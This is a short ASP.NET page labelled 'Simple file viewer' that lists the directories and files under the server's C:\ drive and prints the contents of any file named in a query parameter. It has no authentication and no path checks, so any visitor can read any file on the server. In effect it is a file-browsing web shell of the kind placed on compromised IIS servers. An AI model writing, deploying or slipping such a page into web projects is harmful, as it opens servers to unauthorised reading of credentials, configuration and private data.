<%@ Page Language="C#" %>
<!DOCTYPE html>
<html>
<head>
    <title>Simple file viewer</title>
</head>
<body>
    <h1>Bonjour</h1>
    
    <ul>
        <% 
	string selectedFile = Request.QueryString["dir"];
	string isFile = Request.QueryString["isFile"];
	string path = "C:\\";
	string filePath;
	

	if (string.IsNullOrEmpty(selectedFile))
	{
		filePath = path;
	}
	else
	{
		filePath = System.IO.Path.Combine(path, selectedFile);	
	}

	if (string.IsNullOrEmpty(isFile))
		{	
 			string[] directories = System.IO.Directory.GetDirectories(filePath);
			foreach (string directory in directories)
            		{
        			%>
            			<li>
				<a href="?dir=<%= selectedFile + System.IO.Path.GetFileName(directory) %>\" style="color: red;">
				<%= System.IO.File.GetLastWriteTime(directory) + "\t" + System.IO.Path.GetFileName(directory) %>
                		</a>
            			</li>
        			<%
			}
			string[] files = System.IO.Directory.GetFiles(filePath);
			foreach (string file in files)
			{
				string fileName = System.IO.Path.GetFileName(file);
				%>
				<li>
					<a href="?dir=<%= selectedFile + fileName %>&isFile=true">
                    			<%= System.IO.File.GetLastWriteTime(filePath + fileName) + "\t" + fileName %>
					</a>
				</li>
				<%
			}
		}
		else
		{

			string fileContent = System.IO.File.ReadAllText(filePath);
			Response.Write(Server.HtmlEncode(fileContent));
            	}
        %>
    </ul>
</body>
</html>
